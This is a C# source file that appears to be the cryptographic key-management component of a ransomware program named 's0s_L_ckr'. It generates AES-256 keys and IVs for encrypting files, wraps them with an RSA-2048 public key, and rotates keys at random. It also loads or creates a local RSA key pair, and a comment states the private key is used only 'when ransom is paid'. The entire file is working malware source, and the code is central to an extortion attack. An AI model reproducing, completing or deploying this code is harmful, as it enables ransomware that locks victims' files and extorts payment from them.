using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security;
using System.Security.Cryptography;
using System.Text;


namespace s0s_L_ckr
{
    public sealed class CriptoKeyMgr
    {
        private CriptoKeyMgr() { }

        //Public Key
        private static SecureString PUBL_KEY = null;

        //Private Key -> Use when ransom is paid otherwise null
        private static SecureString PRIV_KEY = null;

        // Key used for Encryption
        public static Byte[] CURR_FIL_ENC_KEY = null;

        //IV Used for Encryption
        public static Byte[] CURR_FIL_ENC_IV = null;

        //AES
        public static Aes CURR_AES_ENC_ENG = null;

        //AES-256 Key Pair Gen
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static void GenAesKeyPair(ref byte[] key, ref byte[] iv)
        {
            using (Aes aes = new AesManaged())
            {
                aes.KeySize = ConfigMgr.CHPR_KEY_SIZ;
                aes.Mode = ConfigMgr.CHPR_MOD;
                aes.Padding = ConfigMgr.CHPR_PAD_MOD;
                aes.GenerateIV();
                aes.GenerateKey();

                byte[] volatileKey = aes.Key;
                byte[] volatileIv = aes.IV;
                key = new byte[volatileKey.Length];
                iv = new byte[volatileIv.Length];
                Array.Copy(volatileKey, key, volatileKey.Length);
                Array.Copy(volatileIv, iv, volatileIv.Length);

                Comn.ClearArray(ref volatileKey);
                Comn.ClearArray(ref volatileIv);

                aes.Clear();
            }
        }

        //Protect AES Key
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static void ProtAesKey(ref Aes currAesEng, ref Byte[] currKey, ref Byte[] currIv, ref SecureString publKey)
        {
            // Free resources for prev AES Engine
            if (currAesEng != null)
                ((IDisposable)currAesEng).Dispose();

            //Restart AES Engine
            currAesEng = new AesManaged();
            currAesEng.KeySize = ConfigMgr.CHPR_KEY_SIZ;
            currAesEng.Mode = ConfigMgr.CHPR_MOD;
            currAesEng.Padding = ConfigMgr.CHPR_PAD_MOD;
            currAesEng.Key = currKey;
            currAesEng.IV = currIv;

            //Key and Password Encryption.
            String pKey = "";
            Comn.OpenSecStr(ref pKey, ref publKey);

            //Load Key to Cipher
            using (RSACryptoServiceProvider rsaAlg = new RSACryptoServiceProvider())
            {
                rsaAlg.FromXmlString(pKey);

                //Encrypt Key and IV
                currKey = rsaAlg.Encrypt(currKey, true);
                currIv = rsaAlg.Encrypt(currIv, true);
            }
            Comn.ClearString(ref pKey);
        }
        //Unprotect AES Key
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static void UnprotectAesKey(ref byte[] protKey, ref byte[] key, ref byte[] protIv, ref byte[] iv)
        {
            //Encrypt Key and Pass
            string pKey = "";
            Comn.OpenSecStr(ref pKey, ref PRIV_KEY);

            //Load into Cipher
            using (RSACryptoServiceProvider rsaAlg = new RSACryptoServiceProvider())
            {
                //Load key into rsa Algorithim
                rsaAlg.FromXmlString(pKey);

                key = rsaAlg.Decrypt(protKey, true);
                iv = rsaAlg.Decrypt(protIv, true);
            }

            Comn.ClearString(ref pKey);
        }

        //RSA-2048 Encryption Key Generation
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static unsafe void GenRsaKeyPai(ref SecureString privAndPubKey, ref SecureString pubKey)
        {
            using (RSA rsa = new RSACryptoServiceProvider())
            {
                rsa.KeySize = 2048;
                string privPub = rsa.ToXmlString(true);
                fixed (char* p = privPub)
                {
                    privAndPubKey = new SecureString(p, privPub.Length);
                    privAndPubKey.MakeReadOnly();
                }

                Comn.ClearString(ref privPub);

                string pub = rsa.ToXmlString(false);
                fixed (char* p = pub)
                {
                    pubKey = new SecureString(p, pub.Length);
                    pubKey.MakeReadOnly();
                }

                Comn.ClearString(ref pub);
            }
        }

        // Cipher Rotation Key

        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static void RotAesKey()
        {
            if (CURR_FIL_ENC_KEY == null)
            {
#if DEBUG
                Trace.WriteLine("[+] Null Key Detected...Generating New Key");
#endif
                GenAesKeyPair(ref CURR_FIL_ENC_KEY, ref CURR_FIL_ENC_IV);
                ProtAesKey(ref CURR_AES_ENC_ENG, ref CURR_FIL_ENC_KEY, ref CURR_FIL_ENC_IV, ref PUBL_KEY);
            }
            else if (Comn.rand.Next(0, 100) == 99) // 1/99 chance to rotate the key generated.
            {
#if DEBUG
                Trace.WriteLine("[+] Key is Rotated");
#endif
                GenAesKeyPair(ref CURR_FIL_ENC_KEY, ref CURR_FIL_ENC_IV);
                ProtAesKey(ref CURR_AES_ENC_ENG, ref CURR_FIL_ENC_KEY, ref CURR_FIL_ENC_IV, ref PUBL_KEY);
            }
        }

        //Loading a local Public Key OR Gen new one

        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public unsafe static void EnsrLocPubKey()
        {
#if DEBUG
            Trace.WriteLine("[*] EnsrLocPubKey");
            Trace.Indent();
#endif
            if (File.Exists(ConfigMgr.LOCL_PUB_KEY_NAM))
            {
#if DEBUG
                Trace.WriteLine("[+] Loading File");
#endif
                // Loading Public Key
                using (FileStream fileStream = File.OpenRead(ConfigMgr.LOCL_PUB_KEY_NAM))
                {
                    //reading key into secure string array and into PUBKEY Variable which is read only
                    byte[] unsecArray = new byte[fileStream.Length];
                    fileStream.Read(unsecArray, 0, unsecArray.Length);
                    string unsecData = Encoding.ASCII.GetString(unsecArray);
                    Comn.ClearArray(ref unsecArray);
                    fixed (char* p = unsecData)
                    {
                        PUBL_KEY = new SecureString(p, unsecData.Length);
                        PUBL_KEY.MakeReadOnly();
                    }
                    Comn.ClearString(ref unsecData);
                }

                // Loading Private Key
                using (FileStream fileStream = File.OpenRead(ConfigMgr.LOCL_PRI_KEY_NAM))
                {
                    // reading private key into secure string array and into PRIVKEY Variable which is read only
                    Byte[] unsecArray = new byte[fileStream.Length];
                    fileStream.Read(unsecArray, 0, unsecArray.Length);
                    String unsecData = ASCIIEncoding.ASCII.GetString(unsecArray);
                    Comn.ClearArray(ref unsecArray);
                    fixed (char* p = unsecData)
                    {
                        PRIV_KEY = new SecureString(p, unsecData.Length);
                        PRIV_KEY.MakeReadOnly();
                    }
                    Comn.ClearString(ref unsecData);
                }
            }
            else
            {
#if DEBUG
                Trace.WriteLine("[+] Creating New File");
#endif
                //Gen new key pair
                CriptoKeyMgr.GenRsaKeyPai(ref PRIV_KEY, ref PUBL_KEY);

                //Saving to file
                using (FileStream fileStream = new FileStream(ConfigMgr.LOCL_PUB_KEY_NAM, FileMode.Create))
                {
                    //Opening File
                    String unsecCon = "";
                    Comn.OpenSecStr(ref unsecCon, ref PUBL_KEY);
                    //Placing to Array
                    Byte[] unsecArray = ASCIIEncoding.ASCII.GetBytes(unsecCon);
                    Comn.ClearString(ref unsecCon);
                    //Plaing to file
                    fileStream.Write(unsecArray, 0, unsecArray.Length);
                    Comn.ClearArray(ref unsecArray);
                }
#if DEBUG
                // Gen new priv key pair
                using (FileStream fileStream = new FileStream(ConfigMgr.LOCL_PRI_KEY_NAM, FileMode.Create))
                {
                    //Opening File
                    String unsecCon = "";
                    Comn.OpenSecStr(ref unsecCon, ref PRIV_KEY);
                    //Placing to Array
                    Byte[] unsecArray = ASCIIEncoding.ASCII.GetBytes(unsecCon);
                    Comn.ClearString(ref unsecCon);
                    //Plaing to file
                    fileStream.Write(unsecArray, 0, unsecArray.Length);
                    Comn.ClearArray(ref unsecArray);
                }
#endif
            }
#if DEBUG
            Trace.Unindent();
#endif
        }
    }
}